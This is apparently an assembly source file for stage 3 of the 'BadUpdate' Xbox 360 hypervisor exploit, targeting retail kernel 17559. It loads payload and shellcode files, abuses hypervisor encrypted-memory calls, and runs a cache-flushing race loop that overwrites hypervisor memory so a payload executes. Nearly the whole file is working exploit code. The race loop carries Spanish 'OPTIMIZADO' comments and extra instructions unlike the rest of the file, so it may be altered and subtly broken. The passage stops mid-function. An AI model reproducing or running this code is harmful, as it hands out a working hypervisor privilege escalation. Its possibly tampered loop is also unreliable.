#-------------------------------------------------------------------------------------------------------------------
# This file contains the assembly code for stage 3 of the exploit. Compiling the C code for stage 3 is non-trivial
# and despite spending multiple days trying to get GCC to compile it (and even writing a custom linker) it's incapable
# of producing working machine code for the C source code. There's a long list of reasons why it can't do it and I
# eventually got tired of fighting with it and gave up.
#
# This assembly file is made from compiling small bits of the C code in isolation and combining them together.
# I highly recommend no one touch this file and only reference the original C file. If anyone actually needs to recompile
# it from scratch your best bet is to DM me and I can give you the run down on how to do it.
#
# !!! THIS CODE WILL ONLY WORK ON RETAIL 17559 KERNELS !!!
#
# Some of the hypervisor specific memory addresses are baked into the code for this file. I tried to pull these values
# from the BuildConfig files but ran into assembler issues (this GNU assembler is dog shit...). Oh well... DM me if you
# actually have a reason to rebuild this and I'll try to help.
#-------------------------------------------------------------------------------------------------------------------

# Compiler flags, must be set before any code or include directives:
.include "BuildConfig.asm"

# Macro for calculating relocated memory addresses:
.macro DATA_ADDR sym
    .set \sym,      BootAnimCodePageAddress + (_\sym - _start)
.endm

# Macro for generating fake import stubs for kernel/xam functions:
.macro IMPORT_STUB sym

    _\sym:
        lis       %r11, ((\sym >> 16) & 0xFFFF)
        ori       %r11, %r11, (\sym & 0xFFFF)
        mtctr     %r11
        bctr

.endm


# Exploit constants:
.ifndef RETAIL_BUILD
    .error "Stage 3 support for debug builds not implemented"
.endif

_start:

# Pre-calculated addresses for functions/data:
DATA_ADDR RunUpdatePayloadThreadProc

DATA_ADDR aFailedToAlloca
DATA_ADDR aFailedToAlloca_0
DATA_ADDR aFailedToAlloca_1
DATA_ADDR aFailedToAlloca_2
DATA_ADDR aPayloadXkeUpda
DATA_ADDR aFailedToReadXk
DATA_ADDR aFailedToCreate
DATA_ADDR aPayloadUpdateD
DATA_ADDR aFailedToOpenUp
DATA_ADDR aFailedToReadUp
DATA_ADDR aPayloadBadupda
DATA_ADDR aFailedToOpenSh
DATA_ADDR aFailedToAlloca_3
DATA_ADDR aFailedToReadSh
DATA_ADDR aFoundCipherTex
DATA_ADDR aFailedToReserv
DATA_ADDR aFailedToCommit
DATA_ADDR aFailedToOpenSD
DATA_ADDR aErrorReadingFi
DATA_ADDR aErrorReadingFi_0
DATA_ADDR aFailedToAlloca_4
DATA_ADDR aRaceHit0x08x
DATA_ADDR aBlock14Overwri
DATA_ADDR aPatchingHvSysc
DATA_ADDR aRunningPayload
DATA_ADDR aPayloadReturne
DATA_ADDR aPayloadBadnyan
DATA_ADDR aFailedToAlloca_5
DATA_ADDR aFailedToReserv_0
DATA_ADDR aFailedToCommmi

DATA_ADDR imp_DbgPrint
DATA_ADDR imp_MmGetPhysicalAddress
DATA_ADDR imp_KeFlushCacheRange
DATA_ADDR imp_KeLockL2
DATA_ADDR imp_KeStallExecutionProcessor
DATA_ADDR imp_RtlInitAnsiString
DATA_ADDR imp_ObCreateSymbolicLink
DATA_ADDR imp_HalSendSMCMessage
DATA_ADDR imp_VdDisplayFatalError
DATA_ADDR imp_NtClose


###########################################################
# void main()
#
###########################################################
main:

.set back_chain, -0x150
.set var_100, -0x100
.set var_F8, -0xF8
.set var_F0, -0xF0
.set var_EC, -0xEC
.set var_E8, -0xE8
.set var_E4, -0xE4
.set var_E0, -0xE0
.set var_DC, -0xDC
.set var_D8, -0xD8
.set var_D0, -0xD0
.set var_CC, -0xCC
.set var_C8, -0xC8
.set var_C4, -0xC4
.set var_C0, -0xC0
.set var_BC, -0xBC
.set var_B8, -0xB8
.set var_B4, -0xB4
.set var_B0, -0xB0
.set var_AC, -0xAC
.set var_A8, -0xA8
.set var_A4, -0xA4
.set var_A0, -0xA0
.set var_98, -0x98
.set var_90, -0x90
.set var_88, -0x88
.set var_84, -0x84
.set var_80, -0x80
.set var_7C, -0x7C
.set var_78, -0x78
.set var_74, -0x74
.set var_70, -0x70
.set var_68, -0x68
.set var_60, -0x60
.set var_5C, -0x5C
.set var_58, -0x58
.set var_54, -0x54
.set var_50, -0x50
.set var_4C, -0x4C

# FUNCTION CHUNK AT 98031148 SIZE 00000028 BYTES

mflr      %r12
bl        savegprlr_25
stwu      %r1, back_chain(%r1)
lis       %r11, 0xC
stw       %r11, 0x150+var_84(%r1)
li        %r11, 0x6000
stw       %r11, 0x150+var_4C(%r1)
li        %r11, 0
stw       %r11, 0x150+var_54(%r1)
li        %r11, 0
stw       %r11, 0x150+var_50(%r1)
li        %r11, 0
stw       %r11, 0x150+var_EC(%r1)
li        %r11, 0
stw       %r11, 0x150+var_F0(%r1)
li        %r11, 0
stw       %r11, 0x150+var_D0(%r1)
li        %r5, 0x44 # 'D'
li        %r4, 0
addi      %r3, %r1, 0x150+var_CC
bl        _memset
li        %r3, 0x77 # 'w'
bl        SetLEDColor
addi      %r4, %r1, 0x150+var_50
addi      %r3, %r1, 0x150+var_54
bl        ReadUpdateFile
clrlwi.   %r11, %r3, 24
bne       loc_98030074
b         loc_98030618

loc_98030074:
addi      %r4, %r1, 0x150+var_F0
addi      %r3, %r1, 0x150+var_EC
bl        ReadShellCodeFile
clrlwi.   %r11, %r3, 24
bne       loc_9803008C
b         loc_98030618

loc_9803008C:
lwz       %r3, 0x150+var_EC(%r1)
lis       %r11, imp_MmGetPhysicalAddress@ha
lwz       %r11, imp_MmGetPhysicalAddress@l(%r11)
mtctr     %r11
bctrl
clrldi    %r11, %r3, 32
li        %r12, 1
extldi    %r12, %r12, 64,63
or        %r11, %r11, %r12
std       %r11, 0x150+var_F8(%r1)
li        %r6, 0x204
li        %r5, 0x80
li        %r4, -1
li        %r3, 0x3000
bl        _XPhysicalAlloc
stw       %r3, 0x150+var_D8(%r1)
lwz       %r11, 0x150+var_D8(%r1)
cmplwi    cr6, %r11, 0
bne       cr6, loc_9803010C
lis       %r11, aFailedToAlloca@ha
addi      %r3, %r11, aFailedToAlloca@l # "Failed to allocate memory for cipher te"...
lis       %r11, imp_DbgPrint@ha
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, 1
ori       %r3, %r11, 0x240C # 0x1240C
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl
b         loc_98030618

loc_9803010C:
li        %r5, 0x3000
li        %r4, 0
lwz       %r3, 0x150+var_D8(%r1)
bl        _memset
lis       %r11, 0x2000
ori       %r6, %r11, 0x204 # 0x20000204
lis       %r5, 1
li        %r4, -1
lwz       %r3, 0x150+var_84(%r1)
bl        _XPhysicalAlloc
stw       %r3, 0x150+var_60(%r1)
lwz       %r11, 0x150+var_60(%r1)
cmplwi    cr6, %r11, 0
bne       cr6, loc_98030178
lis       %r11, aFailedToAlloca_0@ha
addi      %r3, %r11, aFailedToAlloca_0@l # "Failed to allocate memory for update da"...
lis       %r11, imp_DbgPrint@ha
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, 1
ori       %r3, %r11, 0x240D # 0x1240D
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl
b         loc_98030618

loc_98030178:
lwz       %r5, 0x150+var_84(%r1)
li        %r4, 0
lwz       %r3, 0x150+var_60(%r1)
bl        _memset
lwz       %r11, 0x150+var_D8(%r1)
stw       %r11, 0x150+var_E0(%r1)
lwz       %r11, 0x150+var_E0(%r1)
li        %r10, -1
std       %r10, 0(%r11)
lwz       %r11, 0x150+var_E0(%r1)
lis       %r10, 3
ori       %r10, %r10, 0x940 # 0x30940
lis       %r9, -0x8000
ori       %r9, %r9, 0x106 # 0x80000106
insrdi    %r10, %r9, 32,0
std       %r10, 8(%r11)
lwz       %r11, 0x150+var_54(%r1)
lwz       %r11, 0x1C(%r11)
stw       %r11, 0x150+var_7C(%r1)
lwz       %r11, 0x150+var_50(%r1)
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
lis       %r10, 1
ori       %r10, %r10, 0x7F # 0x1007F
add       %r11, %r11, %r10
clrrwi    %r11, %r11, 16
stw       %r11, 0x150+var_74(%r1)
lwz       %r11, 0x150+var_7C(%r1)
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
lwz       %r10, 0x150+var_74(%r1)
add       %r11, %r10, %r11
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
stw       %r11, 0x150+var_78(%r1)
lwz       %r6, 0x150+var_E0(%r1)
lwz       %r5, 0x150+var_78(%r1)
lwz       %r4, 0x150+var_84(%r1)
lwz       %r3, 0x150+var_60(%r1)
bl        BuildCipherTextLookupTable
lwz       %r5, 0x150+var_84(%r1)
li        %r4, 0
lwz       %r3, 0x150+var_60(%r1)
bl        _memset
lwz       %r11, 0x150+var_60(%r1)
stw       %r11, 0x150+var_58(%r1)
lwz       %r11, 0x150+var_84(%r1)
lwz       %r10, 0x150+var_58(%r1)
stw       %r11, 0(%r10)
lwz       %r11, 0x150+var_58(%r1)
li        %r10, 0x80
stw       %r10, 4(%r11)
lwz       %r11, 0x150+var_58(%r1)
li        %r10, 0x80
stw       %r10, 0x20(%r11)
lwz       %r11, 0x150+var_50(%r1)
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
lwz       %r10, 0x150+var_58(%r1)
stw       %r11, 0x24(%r10)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r10, 0x150+var_58(%r1)
lwz       %r11, 0x20(%r11)
lwz       %r10, 0x24(%r10)
add       %r11, %r11, %r10
lis       %r10, 0
ori       %r10, %r10, 0xFFFF # 0xFFFF
add       %r11, %r11, %r10
clrrwi    %r11, %r11, 16
lwz       %r10, 0x150+var_58(%r1)
stw       %r11, 0x28(%r10)
lwz       %r11, 0x150+var_7C(%r1)
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
lwz       %r10, 0x150+var_58(%r1)
stw       %r11, 0x2C(%r10)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r10, 0x150+var_58(%r1)
lwz       %r11, 0x28(%r11)
lwz       %r10, 0x2C(%r10)
add       %r11, %r11, %r10
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
lwz       %r10, 0x150+var_58(%r1)
stw       %r11, 0x30(%r10)
lwz       %r11, 0x150+var_58(%r1)
lis       %r10, 2
stw       %r10, 0x34(%r11)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r10, 0x150+var_58(%r1)
lwz       %r11, 0x30(%r11)
lwz       %r10, 0x34(%r10)
add       %r11, %r11, %r10
addi      %r11, %r11, 0x7F
clrrwi    %r11, %r11, 7
lwz       %r10, 0x150+var_58(%r1)
stw       %r11, 0x38(%r10)
lwz       %r11, 0x150+var_58(%r1)
lis       %r10, 1
stw       %r10, 0x3C(%r11)
li        %r6, 0x204
lis       %r5, 1
li        %r4, -1
lwz       %r3, 0x150+var_4C(%r1)
bl        _XPhysicalAlloc
stw       %r3, 0x150+var_E4(%r1)
lwz       %r11, 0x150+var_E4(%r1)
cmplwi    cr6, %r11, 0
bne       cr6, loc_98030360
lis       %r11, aFailedToAlloca_1@ha
addi      %r3, %r11, aFailedToAlloca_1@l # "Failed to allocate payload memory\n"
lis       %r11, imp_DbgPrint@ha
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, 1
ori       %r3, %r11, 0x240E # 0x1240E
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl
b         loc_98030618

loc_98030360:
li        %r6, 4
li        %r5, 0
li        %r4, -1
lwz       %r3, 0x150+var_4C(%r1)
bl        _XPhysicalAlloc
stw       %r3, 0x150+var_DC(%r1)
lwz       %r11, 0x150+var_DC(%r1)
cmplwi    cr6, %r11, 0
bne       cr6, loc_980303B8
lis       %r11, aFailedToAlloca_2@ha
addi      %r3, %r11, aFailedToAlloca_2@l # "Failed to allocate clean payload memory"...
lis       %r11, imp_DbgPrint@ha
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, 1
ori       %r3, %r11, 0x240F # 0x1240F
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl
b         loc_98030618

loc_980303B8:
lwz       %r5, 0x150+var_4C(%r1)
li        %r4, 0
lwz       %r3, 0x150+var_E4(%r1)
bl        _memset
lwz       %r5, 0x150+var_4C(%r1)
li        %r4, 0
lwz       %r3, 0x150+var_DC(%r1)
bl        _memset
lwz       %r6, 0x150+var_4C(%r1)
li        %r5, 0
lwz       %r4, 0x150+var_DC(%r1)
lis       %r11, aPayloadXkeUpda@ha
addi      %r3, %r11, aPayloadXkeUpda@l # "PAYLOAD:\\xke_update.bin"
bl        ReadFileHelper
clrlwi.   %r11, %r3, 24
bne       loc_9803042C
lis       %r11, aFailedToReadXk@ha
addi      %r3, %r11, aFailedToReadXk@l # "Failed to read XKE payload file\n"
lis       %r11, imp_DbgPrint@ha
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, 1
ori       %r3, %r11, 0x2410 # 0x12410
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl
b         loc_98030618

loc_9803042C:
lwz       %r3, 0x150+var_60(%r1)
lis       %r11, imp_MmGetPhysicalAddress@ha
lwz       %r11, imp_MmGetPhysicalAddress@l(%r11)
mtctr     %r11
bctrl
stw       %r3, 0x150+var_B4(%r1)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r11, 0(%r11)
stw       %r11, 0x150+var_B0(%r1)
lwz       %r11, 0x150+var_DC(%r1)
stw       %r11, 0x150+var_C4(%r1)
lwz       %r11, 0x150+var_E4(%r1)
stw       %r11, 0x150+var_C0(%r1)
lwz       %r3, 0x150+var_E4(%r1)
lis       %r11, imp_MmGetPhysicalAddress@ha
lwz       %r11, imp_MmGetPhysicalAddress@l(%r11)
mtctr     %r11
bctrl
stw       %r3, 0x150+var_BC(%r1)
lwz       %r11, 0x150+var_4C(%r1)
stw       %r11, 0x150+var_B8(%r1)
lwz       %r11, 0x150+var_54(%r1)
stw       %r11, 0x150+var_D0(%r1)
lwz       %r11, 0x150+var_50(%r1)
stw       %r11, 0x150+var_CC(%r1)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r10, 0x150+var_60(%r1)
lwz       %r11, 0x20(%r11)
add       %r11, %r10, %r11
stw       %r11, 0x150+var_C8(%r1)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r10, 0x150+var_60(%r1)
lwz       %r11, 0x30(%r11)
add       %r11, %r10, %r11
stw       %r11, 0x150+var_AC(%r1)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r11, 0x30(%r11)
stw       %r11, 0x150+var_A8(%r1)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r11, 0x34(%r11)
stw       %r11, 0x150+var_A4(%r1)
lwz       %r11, 0x150+var_E0(%r1)
ld        %r11, 8(%r11)
std       %r11, 0x150+var_A0(%r1)
ld        %r11, 0x150+var_F8(%r1)
std       %r11, 0x150+var_98(%r1)
lwz       %r11, 0x150+var_58(%r1)
lwz       %r10, 0x150+var_60(%r1)
lwz       %r11, 0x30(%r11)
add       %r11, %r10, %r11
stw       %r11, 0x150+var_80(%r1)
lwz       %r11, 0x150+var_80(%r1)
stw       %r11, 0x150+var_90(%r1)
li        %r8, 0
li        %r7, 4
addi      %r6, %r1, 0x150+var_D0
lis       %r11, RunUpdatePayloadThreadProc@ha
addi      %r5, %r11, RunUpdatePayloadThreadProc@l # RunUpdatePayloadThreadProc
li        %r4, 0
li        %r3, 0
bl        _CreateThread
stw       %r3, 0x150+var_5C(%r1)
lwz       %r11, 0x150+var_5C(%r1)
cmplwi    cr6, %r11, 0
bne       cr6, loc_98030564
lis       %r11, aFailedToCreate@ha
addi      %r3, %r11, aFailedToCreate@l # "Failed to create worker thread\n"
lis       %r11, imp_DbgPrint@ha
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, 1
ori       %r3, %r11, 0x2411 # 0x12411
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl
b         loc_98030618

loc_98030564:
li        %r4, 1
lwz       %r3, 0x150+var_5C(%r1)
bl        _XSetThreadProcessor
stw       %r3, 0x150+var_E8(%r1)
lwz       %r3, 0x150+var_5C(%r1)
bl        _ResumeThread
lwz       %r11, 0x150+var_E0(%r1)
ld        %r11, 0x10(%r11)
std       %r11, 0x150+var_100(%r1)
lwz       %r11, 0x150+var_E0(%r1)
ld        %r11, 0x20(%r11)
std       %r11, 0x150+var_68(%r1)
lwz       %r11, 0x150+var_E0(%r1)
ld        %r11, 0x28(%r11)
std       %r11, 0x150+var_70(%r1)
lis       %r11, 1
ori       %r11, %r11, 0x86A0 # 0x186A0
stw       %r11, 0x150+var_88(%r1)
lwz       %r11, 0x150+var_80(%r1)
lwz       %r10, 0x150+var_80(%r1)
or        %r31, %r11, %r10
ld        %r11, 0x150+var_100(%r1)
ld        %r10, 0x150+var_100(%r1)
or        %r30, %r11, %r10
ld        %r11, 0x150+var_68(%r1)
ld        %r10, 0x150+var_68(%r1)
or        %r29, %r11, %r10
ld        %r11, 0x150+var_70(%r1)
ld        %r10, 0x150+var_70(%r1)
or        %r28, %r11, %r10
addi      %r26, %r31, 0x2B00
lwz       %r11, 0x150+var_88(%r1)
lwz       %r10, 0x150+var_88(%r1)
or        %r25, %r11, %r10

# OPTIMIZADO: Bucle principal de ataque mejorado
loc_980305EC:
# Asegurarse de que la memoria principal tiene datos frescos
sync
dcbf      0, %r31
sync
# 3 ciclos de espera para asegurar que la caché se ha limpiado
nop
nop
nop
# Leer el valor para la comparación
ld        %r11, 0(%r31)
# Realizar la comparación de manera más robusta
cmpld     cr6, %r11, %r30
bne       cr6, loc_9803060C

# OPTIMIZADO: Aumentado el tamaño del contador para la escritura más agresiva
mtctr     %r25

loc_980305FC:
# OPTIMIZADO: Asegurarse de que las escrituras son correctas
std       %r29, 0x20(%r26)
sync
std       %r28, 0x28(%r26)
# Hacer dcbst más efectivo
dcbst     0, %r26
sync
# Continuar con el bucle
bdnz      loc_980305FC

loc_9803060C:
# OPTIMIZADO: Asegurar que la caché se vacía completamente
dcbf      0, %r31
sync
b         loc_980305EC
.byte 0x48 # H
.byte    0
.byte    0
.byte    8

loc_98030618:
li        %r3, 0
addi      %r1, %r1, 0x150
b         restgprlr_25
# End of function main



###########################################################
# void SetLEDColor(r3 color)
#
###########################################################
SetLEDColor:

.set back_chain, -0x70
.set var_20, -0x20
.set var_1F, -0x1F
.set var_1E, -0x1E
.set var_10, -0x10
.set var_8, -8

mflr      %r12
stw       %r12, var_8(%r1)
std       %r31, var_10(%r1)
stwu      %r1, back_chain(%r1)
mr        %r31, %r3
li        %r5, 0xF
li        %r4, 0
addi      %r3, %r1, 0x70+var_1F
bl        _memset
li        %r11, 0x99
li        %r10, 0xFF
stb       %r31, 0x70+var_1E(%r1)
stb       %r11, 0x70+var_20(%r1)
lis       %r11, imp_HalSendSMCMessage@ha
stb       %r10, 0x70+var_1F(%r1)
li        %r4, 0
addi      %r3, %r1, 0x70+var_20
lwz       %r11, imp_HalSendSMCMessage@l(%r11)
mtctr     %r11
bctrl
addi      %r1, %r1, 0x70
lwz       %r12, var_8(%r1)
mtlr      %r12
ld        %r31, var_10(%r1)
blr
# End of function SetLEDColor



###########################################################
# bool ReadUpdateFile(r3 ppCompressedDataClean, r4 pdwCompressedDataSize)
#
###########################################################
ReadUpdateFile:

.set back_chain, -0xA0
.set var_50, -0x50
.set var_40, -0x40
.set var_38, -0x38
.set var_30, -0x30
.set var_28, -0x28
.set var_20, -0x20
.set var_18, -0x18
.set var_10, -0x10
.set var_8, -8

# FUNCTION CHUNK AT 98031148 SIZE 00000028 BYTES

mflr      %r12
bl        savegprlr_25
stwu      %r1, back_chain(%r1)
li        %r11, 0
lis       %r10, aPayloadUpdateD@ha
stw       %r11, 0xA0+var_50(%r1)
mr        %r26, %r3
mr        %r25, %r4
li        %r9, 0
addi      %r3, %r10, aPayloadUpdateD@l # "PAYLOAD:\\update_data.bin"
li        %r8, 0x80
li        %r7, 3
li        %r6, 0
li        %r5, 1
lis       %r4, -0x8000
bl        _CreateFileA
mr        %r29, %r3
cmpwi     cr6, %r3, -1
bne       cr6, loc_98030700
lis       %r11, imp_DbgPrint@ha
lis       %r10, aFailedToOpenUp@ha
addi      %r3, %r10, aFailedToOpenUp@l # "Failed to open update data file\n"
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, imp_VdDisplayFatalError@ha
lis       %r3, 1
ori       %r3, %r3, 0x2400 # 0x12400
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
b         loc_980307D8

loc_98030700:
li        %r4, 0
mr        %r3, %r29
bl        _GetFileSize
li        %r6, 4
li        %r5, 0
li        %r4, -1
mr        %r31, %r3
bl        _XPhysicalAlloc
mr.       %r30, %r3
lis       %r28, imp_VdDisplayFatalError@ha
lis       %r27, imp_DbgPrint@ha
bne       loc_98030758
lwz       %r11, imp_DbgPrint@l(%r27)
lis       %r10, aFailedToAlloca_0@ha
addi      %r3, %r10, aFailedToAlloca_0@l # "Failed to allocate memory for update da"...
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r28)
lis       %r3, 1
ori       %r3, %r3, 0x2401 # 0x12401
mtctr     %r11
bctrl

loc_98030758:
mr        %r5, %r31
li        %r4, 0
mr        %r3, %r30
bl        _memset
li        %r7, 0
addi      %r6, %r1, 0xA0+var_50
mr        %r5, %r31
mr        %r4, %r30
mr        %r3, %r29
bl        _ReadFile
cmpwi     %r3, 0
beq       loc_980307B8
lwz       %r11, 0xA0+var_50(%r1)
cmplw     cr6, %r11, %r31
bne       cr6, loc_980307B8
stw       %r30, 0(%r26)
lis       %r11, imp_NtClose@ha
stw       %r31, 0(%r25)
mr        %r3, %r29
lwz       %r11, imp_NtClose@l(%r11)
mtctr     %r11
bctrl
li        %r3, 1
b         loc_980307E4

loc_980307B8:
lwz       %r11, imp_DbgPrint@l(%r27)
lis       %r10, aFailedToReadUp@ha
addi      %r3, %r10, aFailedToReadUp@l # "Failed to read update data file\n"
mtctr     %r11
bctrl
lis       %r3, 1
lwz       %r11, imp_VdDisplayFatalError@l(%r28)
ori       %r3, %r3, 0x2402 # 0x12402

loc_980307D8:
mtctr     %r11
bctrl
li        %r3, 0

loc_980307E4:
addi      %r1, %r1, 0xA0
b         restgprlr_25
# End of function ReadUpdateFile



###########################################################
# bool ReadShellCodeFile(r3 ppShellCodeBuffer, r4 pdwShellCodeBufferSize)
#
###########################################################
ReadShellCodeFile:

.set back_chain, -0xA0
.set var_50, -0x50
.set var_48, -0x48

# FUNCTION CHUNK AT 98031144 SIZE 00000004 BYTES

mflr      %r12
bl        savegprlr_24
stwu      %r1, back_chain(%r1)
li        %r11, 0
lis       %r10, aPayloadBadupda@ha
stw       %r11, 0xA0+var_50(%r1)
mr        %r25, %r3
mr        %r24, %r4
li        %r9, 0
addi      %r3, %r10, aPayloadBadupda@l # "PAYLOAD:\\BadUpdateExploit-4thStage.bin"
li        %r8, 0x80
li        %r7, 3
li        %r6, 0
li        %r5, 1
lis       %r4, -0x8000
bl        _CreateFileA
mr        %r29, %r3
cmpwi     cr6, %r3, -1
bne       cr6, loc_98030864
lis       %r11, imp_DbgPrint@ha
lis       %r10, aFailedToOpenSh@ha
addi      %r3, %r10, aFailedToOpenSh@l # "Failed to open shell code file\n"
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
lis       %r11, imp_VdDisplayFatalError@ha
lis       %r3, 1
ori       %r3, %r3, 0x2403 # 0x12403
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
b         loc_9803094C

loc_98030864:
li        %r4, 0
mr        %r3, %r29
bl        _GetFileSize
addi      %r11, %r3, 0x7F
lis       %r6, 0x2000
clrrwi    %r30, %r11, 7
mr        %r28, %r3
ori       %r6, %r6, 0x204 # 0x20000204
lis       %r5, 1
li        %r4, -1
mr        %r3, %r30
bl        _XPhysicalAlloc
mr.       %r31, %r3
lis       %r27, imp_VdDisplayFatalError@ha
lis       %r26, imp_DbgPrint@ha
bne       loc_980308CC
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToAlloca_3@ha
addi      %r3, %r10, aFailedToAlloca_3@l # "Failed to allocate memory for shell cod"...
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2404 # 0x12404
mtctr     %r11
bctrl

loc_980308CC:
mr        %r5, %r30
li        %r4, 0
mr        %r3, %r31
bl        _memset
li        %r7, 0
addi      %r6, %r1, 0xA0+var_50
mr        %r5, %r28
mr        %r4, %r31
mr        %r3, %r29
bl        _ReadFile
cmpwi     %r3, 0
beq       loc_9803092C
lwz       %r11, 0xA0+var_50(%r1)
cmplw     cr6, %r11, %r28
bne       cr6, loc_9803092C
stw       %r31, 0(%r25)
lis       %r11, imp_NtClose@ha
stw       %r30, 0(%r24)
mr        %r3, %r29
lwz       %r11, imp_NtClose@l(%r11)
mtctr     %r11
bctrl
li        %r3, 1
b         loc_98030958

loc_9803092C:
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToReadSh@ha
addi      %r3, %r10, aFailedToReadSh@l # "Failed to read shell code file\n"
mtctr     %r11
bctrl
lis       %r3, 1
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
ori       %r3, %r3, 0x2405 # 0x12405

loc_9803094C:
mtctr     %r11
bctrl
li        %r3, 0

loc_98030958:
addi      %r1, %r1, 0xA0
b         restgprlr_24
# End of function ReadShellCodeFile



###########################################################
# void BuildCipherTextLookupTable(r3 pUpdateData, r4 UpdateDataSize, r5 ScratchOffset, r6 pCipherTextData)
#
###########################################################
BuildCipherTextLookupTable:

.set back_chain, -0xB0
.set var_60, -0x60
.set var_58, -0x58
.set var_50, -0x50

# FUNCTION CHUNK AT 98031138 SIZE 0000000C BYTES

mflr      %r12
bl        savegprlr_21
stwu      %r1, back_chain(%r1)
lis       %r31, imp_MmGetPhysicalAddress@ha
mr        %r26, %r3
mr        %r3, %r6
mr        %r22, %r4
mr        %r27, %r5
lwz       %r11, imp_MmGetPhysicalAddress@l(%r31)
mr        %r30, %r6
mtctr     %r11
bctrl
lwz       %r11, imp_MmGetPhysicalAddress@l(%r31)
mr        %r3, %r26
mtctr     %r11
bctrl
lis       %r11, aFoundCipherTex@ha
mr        %r21, %r3
li        %r23, 0
lis       %r28, imp_KeFlushCacheRange@ha
lis       %r25, imp_DbgPrint@ha
addi      %r24, %r11, aFoundCipherTex@l # "Found cipher text for whitening 0x%04x:"...

loc_980309B8:
mr        %r5, %r22
mr        %r4, %r21
lis       %r3, -0x7300
bl        HvxEncryptedReserveAllocation_
cmplwi    %r3, 0
beq       loc_98030AF8
lis       %r3, -0x7300
bl        HvxEncryptedEncryptAllocation_
cmplwi    %r3, 0
beq       loc_98030B1C
cmpwi     cr6, %r23, 0x111
bne       cr6, loc_98030AD8
addis     %r31, %r27, -0x7300
li        %r5, 0x10
li        %r4, 0
mr        %r3, %r31
bl        _memset
lis       %r11, 0x4349
lis       %r10, 0
ori       %r11, %r11, 0x444C # 0x4349444C
ori       %r10, %r10, 0x8000 # 0x8000
li        %r9, 1
stw       %r11, 0(%r31)
lis       %r11, -0x7300
stw       %r10, 4(%r31)
stw       %r9, 8(%r31)
dcbst     %r27, %r11
li        %r4, 0x80
lwz       %r11, imp_KeFlushCacheRange@l(%r28)
mr        %r3, %r31
mtctr     %r11
bctrl
lwz       %r11, imp_KeFlushCacheRange@l(%r28)
add       %r29, %r26, %r27
li        %r4, 0x80
mr        %r3, %r29
mtctr     %r11
bctrl
addi      %r3, %r30, 0x10
li        %r5, 0x10
mr        %r4, %r29
bl        _memcpy
ld        %r9, 0(%r30)
lis       %r11, -0x7300
addi      %r10, %r27, 0x2B00
std       %r9, 0x2B20(%r31)
ld        %r9, 8(%r30)
std       %r9, 0x2B28(%r31)
dcbst     %r10, %r11
li        %r4, 0x80
lwz       %r11, imp_KeFlushCacheRange@l(%r28)
addi      %r3, %r31, 0x2B00
mtctr     %r11
bctrl
lwz       %r11, imp_KeFlushCacheRange@l(%r28)
li        %r4, 0x80
addi      %r3, %r29, 0x2B00
mtctr     %r11
bctrl
addi      %r3, %r30, 0x20 # ' '
addi      %r4, %r29, 0x2B20
li        %r5, 0x10
bl        _memcpy
lwz       %r11, imp_DbgPrint@l(%r25)
mr        %r3, %r24
lwz       %r8, 0x24(%r30)
li        %r4, 0x111
lwz       %r7, 0x20(%r30)
lwz       %r6, 0x14(%r30)
lwz       %r5, 0x10(%r30)
mtctr     %r11
bctrl

loc_98030AD8:
lis       %r3, -0x7300
bl        HvxEncryptedReleaseAllocation_
cmpwi     cr6, %r23, 0x111
beq       cr6, loc_98030B4C
addi      %r23, %r23, 1
cmpwi     cr6, %r23, 0x400
blt       cr6, loc_980309B8
b         loc_98030B4C

loc_98030AF8:
lwz       %r11, imp_DbgPrint@l(%r25)
lis       %r10, aFailedToReserv@ha
li        %r4, 0
addi      %r3, %r10, aFailedToReserv@l # "Failed to reserve encrypted memory 0x%0"...
mtctr     %r11
bctrl
lis       %r3, 1
ori       %r3, %r3, 0x2409 # 0x12409
b         loc_98030B3C

loc_98030B1C:
lwz       %r11, imp_DbgPrint@l(%r25)
lis       %r10, aFailedToCommit@ha
li        %r4, 0
addi      %r3, %r10, aFailedToCommit@l # "Failed to commit encrypted memory 0x%08"...
